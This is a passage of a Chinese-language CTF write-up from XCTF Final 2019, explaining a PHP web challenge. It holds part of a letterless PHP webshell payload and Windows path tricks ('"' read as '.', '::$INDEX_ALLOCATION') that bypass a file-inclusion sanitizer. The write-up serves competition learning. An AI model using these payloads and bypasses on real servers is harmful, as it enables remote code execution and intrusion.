class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_____($__)<span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>不过他们可能搞错了，这里他们本意想用<code>&lt;?=?&gt;</code>来绕过<code>;</code>限制，但是其实<code>;</code>并没有过滤…</p><p>最后一步可以说有了，我们来看看前几步，<code>Put</code>类的<code>__construct</code>有一个<code>path_sanitizer</code>，我们可以看到有一些检查什么的，没有<code>false</code>的情况是不会过滤<code>/</code>的，这里初始化的时候不会过滤<code>/</code>。</p><p>所以如果我们在写文件的时候，用<code>put&amp;test/test</code>去写<code>test</code>目录<code>test</code>文件，<code>file_put_contents</code>会因为<code>test</code>目录不存在而写不进去。</p><p></p><figure class="highlight reasonml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="hljs-constructor">_put_contents(.<span class="hljs-operator">/</span><span class="hljs-params">test</span><span class="hljs-operator">/</span><span class="hljs-params">test</span>)</span>: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such file <span class="hljs-keyword">or</span> directory</span><br></pre></td></tr></tbody></table></figure><p></p><p>那如果我们直接写进一个<code>test</code>文件呢？写是没有问题的，但是我们在用<code>get</code>路由读的时候就会发生问题了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>{</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;filename === <span class="hljs-keyword">false</span>){</span><br><span class="line">    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"blocked by path sanitizer"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// wtf???? //</span></span><br><span class="line">  <span class="hljs-keyword">if</span>(!@file_exists(<span class="hljs-keyword">$this</span>-&gt;filename)){</span><br><span class="line">    <span class="hljs-comment">// index files are *completely* disabled. //</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-string">"index"</span>) !== <span class="hljs-keyword">false</span>){</span><br><span class="line">      <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"you cannot include index files!"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// hardened sanitizer spawned. thus we sense ambiguity //</span></span><br><span class="line">    $read_file = <span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename;</span><br><span class="line">    $read_file_with_hardened_filter = <span class="hljs-string">"./files/"</span> . path_sanitizer(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>($read_file === $read_file_with_hardened_filter ||</span><br><span class="line">       @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){</span><br><span class="line">      <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"request blocked"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// .. and finally, include *un*exploitable file is included. //</span></span><br><span class="line">    @<span class="hljs-keyword">include</span>(<span class="hljs-string">"./files/"</span> . <span class="hljs-keyword">$this</span>-&gt;filename);</span><br><span class="line">    <span class="hljs-keyword">return</span> [<span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"success"</span>];</span><br><span class="line">  }<span class="hljs-keyword">else</span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> [<span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"invalid filename (wtf)"</span>, <span class="hljs-string">"type"</span> =&gt; <span class="hljs-string">"error"</span>];</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们仔细看这段代码，由于<code>path_sanitizer</code>传入了<code>true</code>，这里会把传入的文件名当中<code>/</code>过滤为空，然后有一个比较，如果直接拼接得到的路径与拼接上过滤之后得到的路径相等的话，会进一步比较他们的文件内容，如果相等的话就会被 block …而我们要进行 include ，那就需要绕过这两个判断…</p><p>什么个意思呢？就是即使文件名相等，内容也不能相等。</p><p>但是我们这里要注意<code>path_sanitizer</code>，如果我们传入一个含有<code>/</code>的文件名那就可以利用这个方法绕过文件名的判断，直接进行包含了。</p><p>而题目环境我们可以由一开始的 phpinfo 得到是一个 windows 的环境（虽然赛场是没有的，但是也可以通过各种方法判断一下，比如 nmap 啥的…）</p><p>所以我们现在主要就是绕读写文件这一块了。</p><h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick 1"></a>Trick 1</h3><blockquote><p>​ 对于Windows的文件读取，有一个小 Trick ：使用<code>FindFirstFile</code>这个API的时候，其会把<code>"</code>解释为<code>.</code>。</p><p></p><figure class="highlight stata hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">shell</span>"php === <span class="hljs-keyword">shell</span>.php		<span class="hljs-comment">//true</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>所以我们可以利用这个 trick ，来构造文件名为<code>"/test</code>的文件，什么个意思呢？</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$read_file = <span class="hljs-string">"./files/./test"</span>;</span><br><span class="line">$read_file_with_hardened_filter = <span class="hljs-string">"./files/.test"</span>;</span><br><span class="line">file_get_contents($read_file) = <span class="hljs-string">'实际文件内容'</span>;</span><br><span class="line">file_get_contents($read_file_with_hardened_filter) = <span class="hljs-keyword">false</span> <span class="hljs-comment">//文件不存在</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>传入的<code>"/test</code>文件名，由于这个 trick ，会被 Windows 认为是<code>./test</code>，所以在处理这个方式上就产生了差异也就绕过了两个判断</p><h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick 2"></a>Trick 2</h3><p>可以参考 <a href="https://c1h3ng.github.io/web/2018/06/19/windows-tricks/" target="_blank" rel="noopener">windows的一些特性</a> 这篇文章，文章最后告诉我们，可以上传一个文件名为<code>test::$INDEX_ALLOCATION</code>的文件，就相当于创建了一个<code>test</code>的文件夹，详细原理可以看该篇文章。</p><p>这样我们就可以先用这个 Trick 创建一个文件夹<code>test</code>，然后用<code>put</code>随意写一个文件<code>test/file</code>，在读取的时候，由于<code>path_sanitizer</code>会把我们的<code>/</code>过滤，就成功绕过了文件名的判断了。绕过了这些就只剩下无字母写 webshell 的问题了。</p><h2 id="noxss"><a href="#noxss" class="headerlink" title="noxss"></a>noxss</h2><p>单独为这道题开一篇文章来写，真的tql…</p><h2 id="tfboys"><a href="#tfboys" class="headerlink" title="tfboys"></a>tfboys</h2><p>机器学习的题目，表示不会…地址在 <a href="https://github.com/Xyntax/XCTF-2019-tfboys" target="_blank" rel="noopener">XCTF-2019-tfboys</a></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113235515.jpeg" alt=""></p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/11/21/XCTF-Final-noxss/">XCTF Final NOXSS Write Up</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/11/13/Red-Hat-2019/">Red Hat 2019 Web Write Up</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>